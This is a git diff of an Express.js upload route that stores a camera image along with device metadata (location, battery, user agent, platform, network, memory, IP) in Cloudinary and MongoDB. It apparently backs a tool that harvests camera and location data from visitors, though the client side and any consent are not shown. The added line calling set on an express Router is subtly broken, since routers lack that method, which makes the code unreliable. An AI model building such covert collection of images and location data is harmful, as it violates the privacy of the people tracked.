@@ -4,40 +4,30 @@ import UserData from "../models/UserData.js";
 
 const router = express.Router();
 
-// Log incoming requests
-router.use((req, res, next) => {
-  console.log("Incoming request:", req.method, req.url);
-  next();
-});
+// Trust proxy if behind proxy (for correct IP)
+router.set('trust proxy', true);
 
 router.post("/upload", async (req, res) => {
   try {
     const { image, metadata } = req.body;
 
-    if (!image) {
-      console.log("No image received");
-      return res.status(400).json({ error: "No image received" });
-    }
-    if (!metadata) {
-      console.log("No metadata received");
-      return res.status(400).json({ error: "No metadata received" });
-    }
+    if (!image) return res.status(400).json({ error: "No image received" });
+    if (!metadata) return res.status(400).json({ error: "No metadata received" });
 
-    // Upload camera image to Cloudinary
+    // Upload image to Cloudinary
     const uploadRes = await cloudinary.uploader.upload(image, { folder: "uploads" });
-    console.log("Camera image uploaded:", uploadRes.secure_url);
 
-    // Save metadata + image URL to MongoDB
+    // Save to MongoDB
     const userData = await UserData.create({
       imageUrl: uploadRes.secure_url,
       useragent: metadata.useragent,
       platform: metadata.platform,
       battery: metadata.battery,
       location: metadata.location,
-      time: metadata.time,
-      ip: metadata.ip,
       deviceMemory: metadata.deviceMemory,
-      network: metadata.network
+      network: metadata.network,
+      time: metadata.time,
+      ip: req.ip
     });
 
     console.log("Data saved to MongoDB:", userData._id);
